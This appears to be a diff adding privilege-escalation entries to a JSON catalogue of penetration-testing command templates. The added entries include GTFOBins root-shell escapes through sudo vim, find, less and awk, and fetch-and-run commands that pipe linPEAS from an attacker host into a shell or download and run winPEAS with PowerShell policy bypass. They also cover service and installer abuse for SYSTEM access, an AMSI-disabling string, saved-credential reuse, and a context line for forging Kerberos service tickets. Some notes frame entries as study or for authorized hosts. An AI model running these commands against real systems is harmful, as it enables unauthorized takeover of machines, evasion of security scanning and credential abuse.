@@ -2512,5 +2512,195 @@
     "encoding": "raw",
     "template": "ticketer.py -nthash {HASH} -domain-sid {SID} -domain {DOMAIN} -spn cifs/{TARGET} Administrator",
     "notes": "Forges a TGS for one service using that service account's hash. Scoped, stealthier than golden."
+  },
+  {
+    "id": "pe2-sudo-l",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "sudo -l (allowed commands)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "sudo -l",
+    "notes": "Lists sudo rights. Any allowed binary -> check GTFOBins for a shell (e.g. NOPASSWD: /usr/bin/find)."
+  },
+  {
+    "id": "pe2-suid-find",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "SUID binaries (find)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "find / -perm -4000 -type f 2>/dev/null",
+    "notes": "SUID runs the file as its owner (often root). Cross-check hits on GTFOBins; use -perm -2000 for SGID."
+  },
+  {
+    "id": "pe2-gtfo-vim",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "GTFOBins — vim (sudo)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "sudo vim -c ':!/bin/sh'",
+    "notes": "vim's :! runs a shell as the elevated process. Works for sudo or SUID vim. GTFOBins."
+  },
+  {
+    "id": "pe2-gtfo-find",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "GTFOBins — find (sudo/SUID)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "sudo find . -exec /bin/sh \\; -quit",
+    "notes": "find -exec runs as the caller's privilege. SUID variant: find . -exec /bin/sh -p \\; -quit keeps euid 0. GTFOBins."
+  },
+  {
+    "id": "pe2-gtfo-less",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "GTFOBins — less (sudo)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "sudo less /etc/profile",
+    "notes": "Inside less press ! then /bin/sh to spawn a shell as the elevated user. GTFOBins."
+  },
+  {
+    "id": "pe2-gtfo-awk",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "GTFOBins — awk (sudo/SUID)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+    "notes": "awk system() runs as the privileged user. SUID variant: awk 'BEGIN {system(\"/bin/sh -p\")}'. GTFOBins."
+  },
+  {
+    "id": "pe2-caps-getcap",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "Linux capabilities (getcap)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "getcap -r / 2>/dev/null",
+    "notes": "cap_setuid+ep on python/perl/node = root via setuid(0); cap_dac_read_search reads /etc/shadow. File capabilities."
+  },
+  {
+    "id": "pe2-cron-writable",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "Writable cron jobs",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "cat /etc/crontab; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null",
+    "notes": "A root cron invoking a world/group-writable script -> overwrite it so your command runs as root."
+  },
+  {
+    "id": "pe2-path-writable",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "Writable dirs in PATH",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "echo $PATH | tr ':' '\\n' | xargs -I{} sh -c 'test -w {} && echo writable: {}'",
+    "notes": "A writable dir early in PATH lets you hijack a binary a root cron/SUID tool calls by bare name. Also check for '.' in PATH."
+  },
+  {
+    "id": "pe2-linpeas-curl",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "linPEAS fetch+run (curl)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "curl -s http://{LHOST}:{LPORT}/linpeas.sh | sh",
+    "notes": "Fetch-and-run Linux enumeration. Serve it: python3 -m http.server {LPORT} from the linpeas dir. Read-only recon; no persistence."
+  },
+  {
+    "id": "pe2-linpeas-wget",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Linux)",
+    "name": "linPEAS fetch+run (wget)",
+    "type": "linux",
+    "encoding": "raw",
+    "template": "wget -qO- http://{LHOST}:{LPORT}/linpeas.sh | sh",
+    "notes": "wget variant for hosts without curl. Same HTTP server step as the curl template."
+  },
+  {
+    "id": "pe2-win-whoami-priv",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Windows)",
+    "name": "whoami /priv (token privileges)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "whoami /priv",
+    "notes": "SeImpersonate/SeAssignPrimaryToken -> Potato family; SeBackup/SeRestore -> read SAM/SYSTEM; SeDebug -> dump LSASS; SeTakeOwnership -> overwrite protected files."
+  },
+  {
+    "id": "pe2-win-winpeas-iwr",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Windows)",
+    "name": "winPEAS fetch+run (IWR)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "powershell -ep bypass -c \"iwr http://{LHOST}:{LPORT}/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe\"",
+    "notes": "Downloads winPEAS then runs it. Serve winPEASx64.exe over HTTP from {LHOST}:{LPORT}. Enumeration only."
+  },
+  {
+    "id": "pe2-win-unquoted-svc",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Windows)",
+    "name": "Unquoted service path (wmic)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"c:\\windows\\\\\"",
+    "notes": "An unquoted path containing spaces + a writable earlier dir -> Windows resolves your exe and runs it as the service account (often SYSTEM)."
+  },
+  {
+    "id": "pe2-win-alwaysinstallelevated",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Windows)",
+    "name": "AlwaysInstallElevated check",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+    "notes": "Both HKLM and HKCU set to 0x1 -> any MSI installs as SYSTEM: msiexec /quiet /qn /i pkg.msi."
+  },
+  {
+    "id": "pe2-win-svc-binpath",
+    "group": "Privilege Escalation",
+    "category": "PrivEsc (Windows)",
+    "name": "Service binpath writable? (sc qc)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "sc qc {SERVICE}",
+    "notes": "Read BINARY_PATH_NAME. If the service is SYSTEM and its exe/dir is writable (accesschk.exe -uwcqv \"Everyone\" *), replace the binary and sc stop/start it."
+  },
+  {
+    "id": "av-uac-integrity-context",
+    "group": "AV / UAC",
+    "category": "AV / UAC",
+    "name": "UAC context (UAC registry)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"",
+    "notes": "Study/recon: EnableLUA and ConsentPromptBehaviorAdmin (0=elevate silently, 2=consent prompt) describe the UAC posture. UAC gates elevation, not admin membership; admins run with a filtered Medium token until elevated."
+  },
+  {
+    "id": "av-amsi-init-failed",
+    "group": "AV / UAC",
+    "category": "AV / UAC",
+    "name": "AMSI — init-failure bypass (study)",
+    "type": "powershell",
+    "encoding": "raw",
+    "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+    "notes": "Defensive/study only. AMSI scans PowerShell script at runtime; this classic string flips AmsiUtils.amsiInitFailed so scans are skipped. Documented so defenders can alert on it. Do not run on systems you do not own."
+  },
+  {
+    "id": "av-runas-savecred",
+    "group": "AV / UAC",
+    "category": "AV / UAC",
+    "name": "runas /savecred (cached creds)",
+    "type": "windows",
+    "encoding": "raw",
+    "template": "runas /savecred /user:{USER} cmd",
+    "notes": "Reuses credentials previously cached by runas /savecred in Credential Manager (list them with: cmdkey /list). Elevation-context study; authorized hosts only."
   }
 ]
